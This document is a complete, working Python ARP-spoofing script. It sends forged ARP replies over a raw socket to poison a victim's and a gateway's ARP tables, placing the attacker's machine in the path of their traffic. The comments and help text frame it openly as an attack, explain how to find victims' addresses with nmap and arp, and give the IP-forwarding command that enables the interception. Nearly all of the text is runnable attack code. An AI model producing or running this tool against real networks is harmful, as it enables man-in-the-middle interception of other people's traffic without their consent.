# This is ARP spoofer script, it used to poison the arp table on the gateway and victim on the same network
# Enable packet pass through attacker machine
# echo 1 > /proc/sys/net/ipv4/ip_forward

import socket
from time import sleep
import argparse
import codecs
import sys

class ARPSpoof():
    def __init__(
            self,
            interface : str,
            attacker_mac : str,
            gateway_ip : str,
            victim_ip : str,
            gateway_mac : str,
            victim_mac : str
        ) -> None:
        
        print(f"[+] Started ARP Spoofing attack on: {interface}")
        print(f"[+] Spoofing victim: {victim_mac} with: {attacker_mac}")
        print(f"[+] Spoofing gateway: {gateway_mac} with: {attacker_mac}")
        self.interface = interface
        # converting gateway_ip to network byte order
        self.gateway_ip = socket.inet_aton(gateway_ip) 
        # converting victim_ip to network byte order
        self.victim_ip = socket.inet_aton(victim_ip)
        # converting gateway mac from string "aa:aa:aa:aa:aa:aa" to bytes b"\xaa\xaa\xaa\xaa\xaa\xaa"
        self.gateway_mac = codecs.decode(gateway_mac.replace(":", ""), "hex")
        # same with victim mac
        self.victim_mac = codecs.decode(victim_mac.replace(":", ""), "hex")
        # converting attacker mac
        self.attacker_mac = codecs.decode(attacker_mac.replace(":", ""), "hex")

    def __create_socket(self) -> socket.socket:
        """
        This function creates a raw socket with code 0x0800, which means that frame has an IPv4 packet
        """
        protocol_type = socket.htons(0x0806)
        try:
            sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, protocol_type)
            # this operation must be done as super user
            sock.bind((self.interface, protocol_type))
        except PermissionError:
            print("[!] Operation Not Permitted: Please run as super user!")
            sys.exit(-1)
        return sock

    def __generate_packet(self, to_mac : bytes, to_ip : bytes, from_mac : bytes, from_ip : bytes) -> bytes:
        """
        This function generates a malicious ARP packet, which later will be sent to the Victim with Attacker MAC as Gateway, and to Gateway with Attacker MAC as Victim
        """
        # Protocol code
        arp_code = b'\x08\x06'
        # Hardware Type
        htype = b'\x00\x01'
        # Protocol Type
        ptype = b'\x08\x00'
        # Hardware Length
        hlen = b'\x06'
        # Protocol Length
        plen = b'\x04'
        # Operation Code (Response - \x00\x02, Request - \x00\x01)
        operation = b'\x00\x02'
        # Protocol header
        protocol = htype + ptype + hlen + plen + operation

        # Ethernet packet, defining from and to packet will be sent and which protocol will be used
        # here mac adresses will be Victim -> Attacker, and Gateway -> Attacker
        eth_packet = to_mac + from_mac + arp_code

        # finalized ARP packet
        # Here we are spoofing victim mac and gateway mac with our own mac
        packet = eth_packet + protocol + from_mac + from_ip + to_mac + to_ip
        return packet

    def __re_arp_targets(self, sender_sock : socket.socket) -> None:
        """
        When attacker stops the ARP Poisoning, this function Re-ARP targets of that attack (Gateway and Victim)
        """
        to_victim = self.__generate_packet(
            self.victim_mac,
            self.victim_ip,
            self.gateway_mac,
            self.gateway_ip
        )
        to_gateway = self.__generate_packet(
            self.gateway_mac,
            self.gateway_ip,
            self.victim_mac,
            self.victim_ip
        )
        # send 10 packets
        for _ in range(10):
            sender_sock.send(to_victim)
            sender_sock.send(to_gateway)

    def __send_packets(self, sender_sock : socket.socket, to_victim : bytes, to_gateway : bytes) -> None:
        """
        This function simultaniously send maliciously crafted packets to the Gateway and Victim
        Poisoning the ARP table of them with Attacker mac
        """
        try:
            while True:
                sender_sock.send(to_victim)
                sender_sock.send(to_gateway)
                sleep(1)

        except KeyboardInterrupt:
            # Re-ARP targets here
            print("\n[+] Exit request. Re-ARPing targets...")
            self.__re_arp_targets(sender_sock)
            # close socket
            sender_sock.close()
            print("[+] Done!")
            # exit the programm
            sys.exit(-1)

    def run(self) -> None:
        sock = self.__create_socket()
        to_victim = self.__generate_packet(
            to_mac = self.victim_mac,
            to_ip = self.victim_ip,
            from_mac = self.attacker_mac,
            from_ip = self.gateway_ip
        )
        to_gateway = self.__generate_packet(
            to_mac = self.gateway_mac,
            to_ip = self.gateway_ip,
            from_mac = self.attacker_mac,
            from_ip = self.victim_ip
        )
        self.__send_packets(sock, to_victim, to_gateway)
        
def get_arguments() -> list:
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="Network interface that you want to perform an attack like: wlan0", required=True)
    parser.add_argument("--smac", help="Sender MAC address, MAC address of your machine, which will be sent to the gateway as victim and to victim as gateway", required=True)
    parser.add_argument("--gip", help="Gateway IP address, usually router's IP address like: 192.168.0.1", required=True)
    parser.add_argument("--gmac", help="Gateway MAC address, can be obtained from: sudo arp -a on __gateway line, or from nmap scan of the subnet", required=True)
    parser.add_argument("--vip", help="Victim IP address, also can be obtained with nmap scan: sudo nmap 192.168.0.1/24 to scan 256 adresses on the subnet", required=True)
    parser.add_argument("--vmac", help="Victim MAC address, can be obtained from nmap scan or arp command", required=True)
    args = parser.parse_args()
    return args

def main() -> None:

    # Get all args from argument parser
    args = get_arguments()
    if not args:
        sys.exit(-1)
    
    # if all arguments here passing them to the ARPSpoof class initialization
    arpspoof = ARPSpoof(args.interface, args.smac, args.gip, args.vip, args.gmac, args.vmac)
    arpspoof.run()

if __name__ == "__main__":
    main()